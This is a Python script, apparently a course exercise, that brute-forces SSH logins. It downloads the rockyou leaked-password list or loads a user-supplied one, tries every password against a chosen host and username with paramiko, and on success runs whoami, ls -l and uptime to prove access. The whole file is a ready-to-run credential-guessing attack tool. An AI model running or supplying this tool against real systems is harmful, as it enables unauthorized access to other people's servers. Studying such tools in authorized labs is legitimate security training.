#!/usr/bin/python3

# used the demo script


#import libraries
import getpass, gzip, os, paramiko, re, shutil, tarfile, time, wget

# open function to get host IP from user
def getHost():
    # make host a global variable
    global host
    
    #open loop to cycle through error handling until valid IP input
    while True:
        host = input("Please provide an IP address to connect to: ") or "192.168.1.xx"
    
        #this error handling brought to you by GPT4
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', host):
            octets = host.split('.')
    
            if all(0 <= int(octet) < 256 for octet in octets):
                break
    
            else:
                print("Invalid IP address format. Please try again.")
    
        else:
            print("Invalid IP address format. Please try again.")

# open function to get username from user
def getUser():
    # make user a global variable
    global user
    
    # open a loop to cycle through error handling until valid username input
    while True:
        user = input("Please provide a username: ")
    
        if user.strip():
            break
    
        else:
            print("Username cannot be empty. Please try again.")

# open function to wget and unzip/untar the rockyou dictionary if needed
def download_password_file(url):

    # try to wget it
    try:
        gz_target = wget.download(url)
        tar_target = gz_target[:-3]

        # gunzip
        with gzip.open(gz_target, 'rb') as f_in:
            with open(tar_target, 'wb') as f_out:
                shutil.copyfileobj(f_in, f_out)

        # untar
        with tarfile.open(tar_target, "r:") as tar_ref:
            tar_ref.extractall()
            filename = tar_ref.getnames()[0]

        # send unzipped filename out for use
        return filename
    
    # error with download/extract
    except Exception as e:
        print(f"An error occurred while downloading or extracting rockyou: {e}")
        return None

# open function to convert .txt to py list of words
def read_password_file(filename):

    # empty list
    password_list = []
    
    # open the file and read one word/line at a time
    try:
        with open(filename, 'r') as F:
            for line in F:
                password_list.append(line.strip())

    # error handling
    except FileNotFoundError:
        print("File not found. Please check the file path and try again.")
    
    # error handling
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
    
    # send word list out
    return password_list


# open function to retrieve dictionary
def passFile():
    
    # prompt for dictionary filename or download
    gate1 = input("Do you have a dictionary file (y) or do you need to download one (n)? ").lower()
    
    # download rockyou if user doesn't have one
    if gate1 == 'n':
        url = "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
        filename = download_password_file(url)
    
    # take user's dictionary filepath
    elif gate1 == 'y':
        filename = input("Enter the dictionary file path: ")
    
        # see if user dict exists
        if not os.path.isfile(filename):
            print("The file does not exist. Please check the path and try again.")
            return []
        
    # if it does exist,
    if filename:

        # then call the func to generate list from file
        password_list = read_password_file(filename)

        # and send it out for use
        return password_list
    
    else:
        return []

# open function for what to do on successful login to prove login for user
def execute_commands(ssh):
    commands = ["whoami", "ls -l", "uptime"]
    
    for command in commands:
        stdin, stdout, stderr = ssh.exec_command(command)
        time.sleep(3)
        output = stdout.read().decode()
        print("*~#~*" * 25)
        print(output)
    
    print("*~#~*" * 25)

# open function to attempt ssh login
def sshAttempt(host, user, password, port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # use variables from above
    try:
        print(f"attempting login with {user}/'{password}' at {host}:{port}")
        ssh.connect(host, port, user, password)
        
        # if able to login, then
        print(f"Success! Connected with password: {password}\n")

        # prove it
        time.sleep(2)
        execute_commands(ssh)

        return True

    # if not able to login, then say so
    except paramiko.AuthenticationException:
        print("Authentication Failed!\n")
        time.sleep(2)
        return False

    # eject button
    except KeyboardInterrupt:
        print("Operation cancelled by user.")
        return False

    # other error
    except Exception as e:
        print(f"An error occurred: {e}")
        time.sleep(2)
        return False

    # reset ssh
    finally:
        ssh.close()

# main function
def main():
    getHost()
    getUser()

    gate2 = input("Do you know the password? y/n: ").lower()

    # user knows the login credentials (why use this script .. ?)
    if gate2 == 'y':

        # take creds
        password = getpass.getpass(prompt="Please provide a password: ")

        # log in
        sshAttempt(host, user, password)

    # user has chosen the hard way        
    elif gate2 == 'n':

        # pull in the password list
        password_list = passFile()

        # loop to iterate
        for password in password_list:

            # try to log in
            if sshAttempt(host, user, password):

                # if it works, close the script
                print("happy hunting")
                break

if __name__ == "__main__":
    main()
